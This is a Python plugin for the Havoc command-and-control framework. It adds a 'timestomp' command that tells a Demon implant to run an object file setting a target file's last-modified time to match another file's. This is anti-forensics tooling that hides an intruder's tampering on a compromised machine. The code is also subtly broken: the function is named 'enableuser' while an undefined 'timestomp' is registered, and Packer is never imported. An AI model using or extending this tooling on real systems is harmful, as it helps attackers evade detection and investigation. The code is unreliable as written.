from havoc import Demon, RegisterCommand, RegisterModule
import re

def enableuser( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    targetFile  = params[ 0 ]
    sourceFile    = params[ 1 ]


    packer.addWstr(targetFile)
    packer.addWstr(sourceFile)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to set last modified of <targetFile> to match that of <sourceFile>" )

    demon.InlineExecute( TaskID, "go", f"bin/timestomp.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID
    
RegisterCommand( timestomp, "", "timestomp", "Sets last modified of <targetFile> to match that of <sourceFile>", 0, """<TARGETFILE> <SOURCEFILE>
         targetFile  Required. File to modify. 
         sourceFile  Required. File to copy from""", "targetFile sourceFile" )